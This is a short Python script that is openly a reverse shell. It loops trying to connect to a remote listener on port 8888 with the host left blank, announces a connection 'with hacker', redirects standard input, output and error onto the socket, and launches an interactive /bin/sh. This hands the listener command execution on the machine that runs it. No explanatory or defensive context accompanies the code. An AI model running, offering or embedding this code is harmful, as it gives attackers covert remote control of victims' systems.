import os, socket, subprocess, time

host, port = ('', 8888)
s = socket.socket()
while True:
	try:
		print('trying to connect with hacker on', host, port)
		s.connect((host, port))
	except socket.error as err:
		pass
	else:
		print('Connected to hacker')
		break
	time.sleep(2)

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
